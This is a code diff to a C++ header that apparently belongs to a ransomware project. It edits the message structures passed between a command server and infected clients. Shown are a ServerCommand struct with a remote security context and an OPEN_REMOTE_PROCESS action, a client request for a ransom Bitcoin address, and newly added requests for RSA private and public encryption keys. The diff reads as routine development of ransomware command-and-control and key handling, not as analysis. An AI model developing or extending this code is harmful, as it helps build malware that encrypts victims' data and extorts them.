@@ -94,13 +94,7 @@ struct ServerCommand {
 
     SecurityContext    remoteContext; // the security context to try and perform the command on
 
-    /*
-        'pi' is information about a process the server
-        wants to start on the remote machine, if the action is
-        OPEN_REMOTE_PROCESS, pi will be looked at, otherwise pi can be
-        set as NULL
-    */
-    ProcessInformation pi;
+    //ProcessInformation pi; // Reserved in case of future use.
 
     /*
         The command line arguments provided if action is
@@ -108,15 +102,6 @@ struct ServerCommand {
         otherwise this can be an empty string
     */
     std::string        commandLineArguments;
-
-    /*
-        The uniquely generated public RSA encryption key
-        that is stored on the server alongside the private RSA
-        encryption key. Used to encrypt.
-
-        in string form because you cant send BIO* over sockets.
-    */
-    std::string        publicEncryptionKey;
 
     /*
         The RSA Private key the client can use to decrypt
@@ -138,8 +123,8 @@ struct ServerCommand {
         std::string cliArgs="",
         std::string rsaPubKey="",
         std::string rsaPrivKey=""
-    ) : action(action), pi(pi), 
-        commandLineArguments(cliArgs), publicEncryptionKey(rsaPubKey), privateEncryptionKey(rsaPrivKey)
+    ) : action(action),
+        commandLineArguments(cliArgs), privateEncryptionKey(rsaPrivKey)
     {
     }
 };
@@ -170,6 +155,9 @@ struct ClientRequest {
         kRequestRansomBTCAddress,
         kPing,
         kDisconnectClient,
+        kGetRequestEncryptionKeys,
+        kGetRequestEncryptionKeyPrivate,
+        kGetRequestEncryptionKeyPublic
     };
 
     BOOL              valid;
@@ -190,10 +178,8 @@ struct RSAKeys
 {
     std::string strPublicKey;
     std::string strPrivateKey;
-#ifdef SERVER_RELEASE
     BIO*        bioPublicKey;
     BIO*        bioPrivateKey;
-#endif
 };
 
 typedef UDPResponse   UDPMessage;
